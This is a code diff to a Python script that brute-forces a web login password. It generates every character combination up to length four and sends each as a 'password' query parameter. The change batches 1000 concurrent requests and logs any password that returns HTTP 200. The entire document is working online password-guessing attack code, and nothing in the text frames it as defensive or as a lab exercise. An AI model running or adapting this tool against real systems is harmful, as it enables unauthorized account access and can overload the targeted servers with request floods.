@@ -6,31 +6,51 @@ import time
 from logger import logger
 from env import get_url
 
-async def try_password(session,url,password):
+
+CONCURRENT_ATTEMPTS = 1000
+
+async def try_password(session, url, password):
     params = {'password': password}
     try:
         async with session.get(url, params=params) as response:
-            return response.status, await response.text()
+            return password, response.status, await response.text()
     except asyncio.TimeoutError:
-        logger.debug(f"time out for password {password}")
-        return None, None
+        logger.debug(f"Timeout with password: {password}")
+        return password, None, None
 
 def password_generator(characters,min_length,max_length):
     for length in range(min_length,max_length+1):
         for password in itertools.product(characters,repeat=length):
             yield ''.join(password)
              
-async def brute_force_password(session,url,characters,min_length,max_length):
-    passwords = password_generator(characters,min_length,max_length)
-
+async def brute_force_password(session, url, passwords):
+    tasks = []
+    
     for password in passwords:
-        status, text = await try_password(session,url,password)
-        if status == 200:
-            logger.critical(f"password found: {password}")
-            logger.critical(f"response: {text}")
-            return password
-        elif text:
-            logger.debug(f"password {password} failed")
+        tasks.append(try_password(session, url, password))
+        
+        if len(tasks) >= CONCURRENT_ATTEMPTS:
+            results = await asyncio.gather(*tasks)
+            for password, status, text in results:
+                if status == 200:
+                    logger.critical(f"Password found: {password}")
+                    logger.critical(f"Response: {text}")
+                    return password
+                else:
+                    logger.debug(f"Password {password} failed")
+            tasks = []  # Reset tasks once done
+
+    # Process any remaining passwords if they exist
+    if tasks:
+        results = await asyncio.gather(*tasks)
+        for password, status, text in results:
+            if status == 200:
+                logger.critical(f"Password found: {password}")
+                logger.critical(f"Response: {text}")
+                return password
+            else:
+                logger.debug(f"Password {password} failed")
+
 
 
 async def main():
@@ -39,8 +59,9 @@ async def main():
     min_length = 1
     max_length = 4
     start_time = time.time()
+    passwords = password_generator(characters, min_length, max_length)
     async with aiohttp.ClientSession() as session:
-        password = await brute_force_password(session,url,characters=characters,min_length=min_length,max_length=max_length)
+        password = await brute_force_password(session,url,passwords)
         if password:
             time_elapsed = time.time() - start_time
             logger.critical(f"Time taken to find the password: {time_elapsed:.2f} seconds")
